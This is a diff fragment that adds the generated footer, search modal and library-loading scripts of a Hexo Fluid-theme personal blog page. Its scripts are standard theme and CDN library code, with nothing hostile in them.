+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
